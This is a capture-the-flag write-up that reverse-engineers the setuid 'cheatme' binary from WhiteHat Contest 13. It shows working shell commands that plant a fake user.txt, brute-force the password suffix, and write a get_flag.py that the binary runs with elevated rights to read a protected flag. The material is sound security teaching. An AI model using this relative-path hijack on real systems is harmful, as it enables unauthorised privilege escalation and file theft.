---
layout: post
title: "WhiteHat Contest 13 - Da Lat City"
date:   2017-05-28 13:00
categories: CTF
tags: [WhiteHatContest13]
categories: [pwn]
author: jbz
---

Pwnable - 100 Points

This was an easy pwn challenge. The organizer provided ssh access to one of their servers and you had to exploit this `cheatme` binary to get the flag. You can find the binary [here](https://github.com/jbzteam/CTF/raw/master/WhiteHatContest13/Da-Lat-City/cheatme).

First of all, we can see that the binary is a stripped, 32-bit ELF:
```
cheatme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b1d351292ce3c22474678ea7f4084efe3243f3c5, stripped
```

And it was compiled with the following mitigations:
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We'll soon realize that we don't really care about the mitigations for this challenge.

When we run `cheatme` we notices it asks for credentials, so let's understand what it does with IDA Pro. This is the pseudocode of `main()`:
```C
int __cdecl main()
{
  sub_80488FB();
  sub_8048C97();
  puts("   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ");
  sub_8048AF5();
  puts("   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ");
  sub_8048D77();
  puts("   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ");
  return 1;
}
```
Let's analyze what all these functions do.

`sub_80488FB()` opens the file `head` and prints its output. Nothing interesting.

`sub_8048C97()` is the function that checks for a username and has this code:
```C
int sub_8048C97()
{
  FILE *fd; // [sp+Ch] [bp-4Ch]@1
  char s[30]; // [sp+10h] [bp-48h]@4
  char s1[30]; // [sp+2Eh] [bp-2Ah]@4
  int canary; // [sp+4Ch] [bp-Ch]@1

  c = *MK_FP(__GS__, 20);
  fd = fopen("../../problem/login/user.txt", "r");
  if ( !fd )
  {
    puts("|\rFile user does not exist");
    exit(0);
  }
  fscanf(fd, "%s", s1);
  printf("|\tEnter user     :  ");
  fgets(s, 30, stdin);
  strtok(s, "\n");
  if ( strcmp(s1, s) )
  {
    puts("|\tAccount does not exist. ");
    exit(0);
  }
  return *MK_FP(__GS__, 20) ^ c;
}
```
It basically opens the file `../../problem/login/user.txt` in `s1`, reads user input in `s`, and the it compares the strings. If they don't match they fail. Since the pathname of the file being opened is not absolute, we can easily bypass this check by running `cheatme` from a different path where we can control the `user.txt` file. Let's remember this for later, when we start our exploitation.

`sub_8048AF5()` is the function that checks for the password has this code:
```C
int sub_8048AF5()
{
  int v0; // ST20_4@7
  int v2; // [sp+Ch] [bp-6Ch]@4
  char nptr[5]; // [sp+17h] [bp-61h]@4
  char v4; // [sp+1Ch] [bp-5Ch]@4
  char s[4]; // [sp+21h] [bp-57h]@1
  int v6; // [sp+25h] [bp-53h]@1
  int v7; // [sp+29h] [bp-4Fh]@1
  int v8; // [sp+2Dh] [bp-4Bh]@1
  int v9; // [sp+31h] [bp-47h]@1
  char dest[16]; // [sp+35h] [bp-43h]@1
  char v11; // [sp+45h] [bp-33h]@1
  char s1[17]; // [sp+4Eh] [bp-2Ah]@1
  char s2[13]; // [sp+5Fh] [bp-19h]@4
  int c; // [sp+6Ch] [bp-Ch]@1

  c = *MK_FP(__GS__, 20);
  *(_DWORD *)s = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  printf("|\tEnter Password :  ");
  fgets(s1, 30, stdin);
  sub_8048957(s1);
  strncpy(dest, s1, 16u);
  v11 = 0;
  if ( strcmp(dest, "ContestChallenge") )
  {
    puts("|\tPassword incorrect!. Try again.");
    exit(0);
  }
  strncpy(nptr, s2, 5u);
  v4 = 0;
  v2 = atoi(nptr);
  if ( v2 <= 9999 )
  {
    puts("|\tPassword incorrect!. Try again.");
    exit(0);
  }
  v0 = (31250 * sub_80489B4(dest) & 0x7FFFFFF) + v2;
  sub_8048A5A(v0, s);
  if ( (v2 ^ sub_80489B4(s)) % 22 != 8 )
  {
    puts("|\tPassword incorrect!. Try again.");
    exit(0);
  }
  return *MK_FP(__GS__, 20) ^ c;
}
```
Ok there are a couple more checks for the password. Let's check all of them.

Of course the first thing the function does is loading the user input in `s1`, which is then passed to `sub_8048957()`. This function only checks that the length of `s1` is 23 and that `s1[16] == "-"`. One thing to notice is that IDA shows `s1` and `s2` as two separate variables sized 17 and 13 bytes, but the `fgets()` function reads 30 bytes, which is the sume of the two variables. They are contiguous (you can see that in the declarations' comments), so they are effectively a single block of memory, and `fgets()` will write on all of it.

Then the first 16 bytes of `s1` are copied into `dest`, and it checks whether `dest == "ContestChallenge"`.

Then it copies the first 5 bytes of `s2` in `nptr`, converts them to an integer, and checks if this number is greater than 9999. Then it does a bunch of coperations in `sub_80489B4()` and `sub_8048A5A()`, but we already know enough to start attacking the software. Let's move onto the next and last function.

`sub_8048D77()` is the function that runs a python file called `get_flag.py`:
```C
int sub_8048D77()
{
  __uid_t v0; // ebx@4
  __uid_t v1; // eax@4
  __gid_t v2; // ebx@4
  __gid_t v3; // eax@4
  signed int i; // [sp+Ch] [bp-Ch]@1

  puts("|\tYou can read file flag.txt???");
  write(1, "|\tLoading File: ", 17u);
  for ( i = 0; i <= 2; ++i )
  {
    write(1, ".", 1u);
    sleep(1u);
  }
  v0 = geteuid();
  v1 = geteuid();
  setreuid(v1, v0);
  v2 = getegid();
  v3 = getegid();
  setregid(v3, v2);
  return system("./get_flag.py");
}
```
Nothing too complicated here, after setting `euid` and `egid` (the binary is +s on the remote server,) it runs `./get_flag.py`. Also in this case it's a relative path, so it can be controlled.

Ok let's plan an attack:
1. We have to replicate the original environment because there are many relevant files that are either loaded and executed with relative paths.
2. We can bypass the username check by adding our own username in the `user.txt` file in the replicated environment.
3. We can bypass the password by providing the string `ContestChallenge-XXXXX` where XXXXX is a number.
4. We can run any command by creating `get_flag.py` with arbitrary content. Or we can run the original file if we want.

Let's do this. First, let's see the original environment:
```bash
cheatme@pwnssh14-01-contest13:~/problem/login$ ls -l
total 28
-r-s--sr-x 1 authenticated authenticated 9728 May 26 18:32 cheatme
-r-------- 1 authenticated authenticated   43 May 24 23:58 flag.txt
-r-x------ 1 authenticated authenticated 1728 May 24 23:58 get_flag.py
-r--r--r-- 1 authenticated cheatme        490 May 24 23:58 head
-r-------- 1 authenticated authenticated   17 May 24 23:58 user.txt

```
`cheatme` is setuid `authenticated:authenticated`. All the other files are either self-explanatory or have been described before.

Let's re-create the environment:
```bash
cheatme@pwnssh14-01-contest13:~$ mkdir /tmp/...
cheatme@pwnssh14-01-contest13:~$ cd /tmp/...
cheatme@pwnssh14-01-contest13:/tmp/...$ mkdir -p problem/login
cheatme@pwnssh14-01-contest13:/tmp/...$ cd problem/login/
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ echo admin>user.txt
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ printf "admin\nContestChallenge-XXXXX\n" | ~/problem/login/cheatme 
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
```

Ok the user bypass works. The password is of course wrong, as we have to find the right numbers that validate all the checks. To do this we can just bruteforce the number:
```bash
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ for a in $(seq 10000 99999); do echo $a; printf "admin\nContestChallenge-$a\n" | ~/problem/login/cheatme; done
10000
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10001
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10002
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10003
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10004
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10005
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :  |	Password incorrect!. Try again.
10006
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	You can read file flag.txt???
|	Loading File: ...sh: 1: ./get_flag.py: not found

```

Bingo! `10006` passes the checks as the program tries to execute `./get_flag.py` which obviously doesn't exist in this directory. So we create it and run `cheatme` again:
```bash
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ echo cat ~/problem/login/flag.txt > get_flag.py
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ chmod +x get_flag.py 
cheatme@pwnssh14-01-contest13:/tmp/.../problem/login$ printf "admin\nContestChallenge-10006\n" | ~/problem/login/cheatme 
|	Enter user     :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	Enter Password :     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
|	You can read file flag.txt???
|	Loading File: ...Life is trying things to see if they work.
```

Bingo! `Life is trying things to see if they work.` is our flag. The flag format is `WhiteHat{sha1(flag)}` therefore the final flag is `WhiteHat{a07efd2a91b4ab10d7ce12a8b6c6902aa4e2246e}`.


